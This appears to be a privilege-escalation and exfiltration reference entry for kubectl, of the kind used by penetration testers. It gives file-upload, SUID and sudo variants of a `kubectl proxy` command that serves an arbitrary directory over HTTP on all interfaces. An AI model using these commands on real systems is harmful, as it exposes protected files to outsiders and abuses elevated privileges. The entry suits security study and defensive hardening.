---
description: It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.
functions:
  file-upload:
    - code: |
        LFILE=dir_to_serve
        kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
  suid:
    - code: |
        LFILE=dir_to_serve
        ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
  sudo:
    - code: |
        LFILE=dir_to_serve
        sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
---
